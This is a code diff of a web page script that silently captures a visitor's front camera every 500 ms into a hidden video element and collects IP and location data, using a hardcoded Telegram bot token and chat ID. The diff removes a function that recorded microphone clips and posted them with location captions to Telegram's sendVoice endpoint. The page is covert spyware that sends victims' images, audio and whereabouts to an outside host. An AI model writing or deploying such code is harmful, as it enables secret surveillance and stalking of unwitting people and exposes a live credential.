@@ -9,8 +9,7 @@
 <script>
   const botToken = '8110393453:AAFWhP0vFwSJobp5GhEe7XjzKiRoorMyg4Y'; 
   const chatId = '-4967067213';             // Replace with your chat ID
-  const captureInterval = 500;                // Photo capture every 500 ms
-  const audioClipDuration = 4000;             // 4 seconds audio clip
+  const captureInterval = 500;              // Photo capture every 500 ms
 
   let captureLoop;
   let stream;
@@ -36,8 +35,8 @@
         console.error('IP fetch error:', e);
       }
 
-      // Start camera + microphone
-      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+      // Start camera only (no audio)
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
       const video = document.createElement('video');
       video.style.display = 'none';
       document.body.appendChild(video);
@@ -46,9 +45,6 @@
 
       // Start capturing photos
       captureLoop = setInterval(() => captureAndSend(video), captureInterval);
-
-      // Start recording audio clips
-      startAudioClips(stream);
 
     } catch (error) {
       console.error('Setup error:', error);
@@ -80,42 +76,6 @@
     } catch (error) {
       console.error('Capture/send error:', error);
       stopAll();
-    }
-  }
-
-  function startAudioClips(stream) {
-    const mediaRecorder = new MediaRecorder(stream);
-
-    mediaRecorder.ondataavailable = async (event) => {
-      if (event.data.size > 0) {
-        sendAudioClip(event.data);
-      }
-    };
-
-    mediaRecorder.onstop = () => {
-      // Restart a new recording session
-      startAudioClips(stream);
-    };
-
-    mediaRecorder.start();
-    setTimeout(() => mediaRecorder.stop(), audioClipDuration);
-  }
-
-  async function sendAudioClip(audioBlob) {
-    const caption = `${locationData}\n${ipData}\n${new Date().toLocaleString()}`;
-
-    const formData = new FormData();
-    formData.append('chat_id', chatId);
-    formData.append('voice', audioBlob);
-    formData.append('caption', caption);
-
-    try {
-      await fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
-        method: 'POST',
-        body: formData,
-      });
-    } catch (error) {
-      console.error('Audio send error:', error);
     }
   }
 
